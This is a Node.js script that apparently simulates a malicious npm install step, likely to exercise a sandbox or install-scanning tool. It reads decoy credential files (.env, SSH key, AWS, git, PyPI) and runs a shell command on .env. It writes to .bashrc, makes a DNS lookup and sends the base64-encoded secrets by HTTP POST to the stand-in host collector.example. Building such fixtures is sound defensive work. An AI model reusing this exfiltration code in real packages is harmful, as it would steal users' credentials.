"use strict";

const { execSync } = require("child_process");
const dns = require("dns");
const fs = require("fs");
const http = require("http");

const DECOY_PATHS = [
  "/home/sandbox/.env",
  "/home/sandbox/.ssh/id_rsa",
  "/home/sandbox/.aws/credentials",
  "/home/sandbox/.git-credentials",
  "/home/sandbox/.pypirc",
];

function readDecoys() {
  const chunks = [];
  for (const p of DECOY_PATHS) {
    try {
      if (fs.existsSync(p)) {
        chunks.push(fs.readFileSync(p, "utf8"));
      }
    } catch (_) {}
  }
  return chunks;
}

function runSuspiciousExec() {
  try {
    execSync("sh -c 'base64 /home/sandbox/.env >/dev/null 2>&1'", { stdio: "ignore" });
  } catch (_) {}
}

function writeOutsideWorkspace() {
  try {
    fs.appendFileSync("/home/sandbox/.bashrc", "# safeinstall-npm-demo-outside-write\n", "utf8");
  } catch (_) {}
}

function sendDnsLookup() {
  try {
    dns.lookup("npm-demo.collector.example", () => {});
  } catch (_) {}
}

function sendHttpExfil(chunks) {
  if (!chunks.length) return;
  const payload = Buffer.from(chunks.join("\n"), "utf8").toString("base64");
  const proxyUrl = process.env.HTTP_PROXY || process.env.http_proxy;

  try {
    let reqOpts;
    if (proxyUrl) {
      const parsed = new URL(proxyUrl);
      reqOpts = {
        hostname: parsed.hostname,
        port: parsed.port || 3128,
        path: "http://collector.example/npm-upload",
        method: "POST",
        headers: {
          Host: "collector.example",
          "Content-Type": "application/octet-stream",
          "Content-Length": Buffer.byteLength(payload),
        },
        timeout: 4000,
      };
    } else {
      reqOpts = {
        hostname: "collector.example",
        port: 80,
        path: "/npm-upload",
        method: "POST",
        headers: {
          "Content-Type": "application/octet-stream",
          "Content-Length": Buffer.byteLength(payload),
        },
        timeout: 4000,
      };
    }

    const req = http.request(reqOpts, (res) => {
      res.resume();
    });
    req.on("error", () => {});
    req.write(payload);
    req.end();
  } catch (_) {}
}

function trigger() {
  const chunks = readDecoys();
  runSuspiciousExec();
  writeOutsideWorkspace();
  sendDnsLookup();
  sendHttpExfil(chunks);
}

trigger();
